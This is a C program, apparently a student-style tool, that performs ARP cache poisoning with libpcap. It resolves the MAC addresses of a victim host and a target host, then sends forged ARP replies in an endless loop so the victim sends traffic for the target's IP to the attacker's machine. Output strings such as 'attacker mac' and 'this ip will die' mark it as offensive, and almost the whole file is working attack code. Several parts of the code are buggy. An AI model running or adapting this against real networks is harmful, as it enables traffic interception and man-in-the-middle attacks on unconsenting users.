#include <unistd.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h>

#define MAC_LEN 6

void printMAC(uint8_t* mac){
		for(int i=0;i<5;i++)printf("%02x:",mac[i]);
			printf("%02x\n",mac[5]);
}


typedef struct _arp_hdr {
	uint16_t hd_type;
	uint16_t p_type;
	uint8_t hd_len;
	uint8_t p_len;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
}arp_hdr;

void FILL_ETH(struct ether_header *ethh, uint8_t *dst_mac, uint8_t *src_mac){
		memcpy(ethh->ether_dhost,dst_mac,6);
		memcpy(ethh->ether_shost,src_mac,6);
		ethh->ether_type=ntohs(ETHERTYPE_ARP);
}
void FILL_ARP(arp_hdr * arp_header , uint8_t *sender_mac, uint8_t *target_mac, int opcode){
	
	memcpy(arp_header->sender_mac, sender_mac, 6*sizeof(uint8_t));
	if (target_mac != NULL)
		memcpy(arp_header->target_mac, target_mac, 6*sizeof(uint8_t));
	else
		memset(arp_header->target_mac, 0x00, 6*sizeof(uint8_t));
	
	arp_header->hd_type = htons(ARPHRD_ETHER);	 //hw-type	        : ethernet
	arp_header->p_type = htons(ETHERTYPE_IP);	 //protocol-type	: 2048 for ip
	arp_header->hd_len = ETHER_ADDR_LEN;		 //hw-addr-length       : 6-byte
	arp_header->p_len = sizeof(in_addr_t);		 //protocol-addr-length : 4-byte
	if (opcode)
		arp_header->opcode = htons(ARPOP_REQUEST);//OpCode 		: ARP request
	else
		arp_header->opcode = htons(ARPOP_REPLY);
	

}

uint8_t* sum(struct ether_header *ethh,arp_hdr *arp){
	uint8_t *packet=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(arp_hdr));
	memset(packet,0x00,sizeof(struct ether_header)+sizeof(arp_hdr));
	memcpy(packet,ethh,sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header),arp,sizeof(arp_hdr));
	return packet;
}

uint8_t* send_packet(uint8_t* arp_pkt, char * ip, char * interface, struct pcap_pkthdr *header, int opcode){
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	const unsigned char* packet;
	int res;
	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
	if(handle==NULL){
		fprintf(stderr,"couldn't open device %s:%s\n",interface,errbuf);
		exit(1);
	}
	if(opcode==1){
		if(pcap_sendpacket(handle,arp_pkt,sizeof(struct ether_header)+sizeof(arp_hdr))==-1){
			pcap_perror(handle,0);
			pcap_close(handle);
			exit(1);
		}
	while(1){
		res=pcap_next_ex(handle,&header,&packet);
		struct ether_header *eth_hdr;
		eth_hdr=(struct ether_header *)packet;
		if(ntohs(eth_hdr->ether_type)==ETHERTYPE_ARP){
			struct ether_arp *arph;
			arph=(arp_hdr *)(packet+sizeof(struct ether_header));
			unsigned char ipbuf[32];
			sprintf(ipbuf,"%d.%d.%d.%d",arph->arp_spa[0],arph->arp_spa[1],arph->arp_spa[2],arph->arp_spa[3]);
			if(!strcmp(ipbuf,ip)){
				printf("this ip will die:%s\n",ip);
				uint8_t *mac=(uint8_t *)malloc(6);
				memcpy(mac,&packet[6],6);
				return mac;
			}
			printf("not this ip address");
		}
		if(res==0) continue;
		if(res==-1||res==-2)break;
	}
	pcap_close(handle);
	}
	else if(opcode==0){
		while(1){
			if(pcap_sendpacket(handle,arp_pkt,sizeof(struct ether_header)+sizeof(arp_hdr))==-1){
				pcap_perror(handle,0);
				pcap_close(handle);
				exit(1);
			}
		 	sleep(1);
		}
		return NULL;
	}
}



int main(int argc, char *argv[]){
	

	uint8_t *my_mac=(uint8_t *)malloc(sizeof(uint8_t)*6);
	uint8_t *sender_mac=(uint8_t *)malloc(sizeof(uint8_t)*6);
	uint8_t *target_mac=(uint8_t *)malloc(sizeof(uint8_t)*6);
	struct ifreq ifr;
	struct sockaddr_in *my_ip;
	
	arp_hdr arp_header, fake_arp_header;
	struct ether_header ethh,fake_ethh;
	uint8_t *arp,*fake_arp;
	uint8_t *regular_pkt, *fake_pkt;
	memset(&ifr,0x00,sizeof(ifr));
	strcpy(ifr.ifr_name,argv[1]);
	
	int fd=socket(AF_INET, SOCK_DGRAM,0);
	if(fd==-1){ perror("socket"); exit(1);}  
	
	//자신의 ip가져오기 
	if(ioctl(fd,SIOCGIFADDR,&ifr)==-1){perror("ioctl");exit(1);}
	my_ip=(struct sockaddr_in*)&ifr.ifr_addr;
		
	char attack[32];
	printf("%s",inet_ntop(AF_INET,&my_ip->sin_addr,attack,sizeof(attack)));
	
	//자신의 mac주소 가져오기
	if(ioctl(fd,SIOCGIFHWADDR,&ifr)==-1){perror("ioctl");exit(1);}
	my_mac=(uint8_t*)ifr.ifr_hwaddr.sa_data;
	printf("attacker mac : ");
	printMAC(my_mac);
	memset(&ethh,0x00,sizeof(struct ether_header));
	memset(&arp_header,0x00,sizeof(arp_hdr));
	
	//상대의 mac주소 가져오기
	memset(sender_mac,NULL,6*sizeof(uint8_t));
	FILL_ARP(&arp_header,my_mac,sender_mac,1);
	
	inet_pton(AF_INET,attack,&arp_header.sender_ip);
	inet_pton(AF_INET,argv[2],&arp_header.target_ip);
	

	FILL_ETH(&ethh,"\xff\xff\xff\xff\xff\xff",my_mac);
	
	int size=sizeof(struct ethhdr)+sizeof(arp_hdr);
       	regular_pkt=(uint8_t*)malloc(size*sizeof(uint8_t));
	regular_pkt=sum(&ethh,&arp_header);
	
	struct pcap_pkthdr *header;
	sender_mac= send_packet(regular_pkt,argv[2],argv[1],header,1);
	printf("sender mac :");
	printMAC(sender_mac);
	
	
	memset(&ethh,0x00,sizeof(struct ether_header));
	memset(&arp_header,0x00,sizeof(arp_hdr));

 	
	//target의 mac주소 가져오기
	memset(target_mac, NULL,6*sizeof(uint8_t));
	
	FILL_ARP(&arp_header,my_mac,target_mac,1);
	
	inet_pton(AF_INET,attack,&arp_header.sender_ip);
	inet_pton(AF_INET,argv[3],&arp_header.target_ip);
	
	FILL_ETH(&ethh,"\xff\xff\xff\xff\xff\xff",my_mac);
	
	regular_pkt=sum(&ethh,&arp_header);
        
	memset(&header,NULL,sizeof(struct pcap_pkthdr));	
	target_mac=send_packet(regular_pkt,argv[3],argv[1],header,1);
	printf("target mac : ");
	printMAC(target_mac);	
	//fake arp reply start
	printf("...sending fake arp reply \n");
	memset(&fake_ethh,0x00,sizeof(struct ether_header));
	memset(&fake_arp_header,0x00,sizeof(arp_hdr));
	
	FILL_ARP(&fake_arp_header,my_mac,sender_mac,0);
	inet_pton(AF_INET,argv[3],&fake_arp_header.sender_ip);
	inet_pton(AF_INET,argv[2],&fake_arp_header.target_ip);
	FILL_ETH(&fake_ethh,sender_mac,my_mac);
	fake_pkt=sum(&fake_ethh,&fake_arp_header);
	uint8_t* gogo;
	memset(&header,NULL,sizeof(struct pcap_pkthdr));
	gogo=send_packet(fake_pkt,NULL,argv[1],header,0);
	close(fd);
	return 0;
}
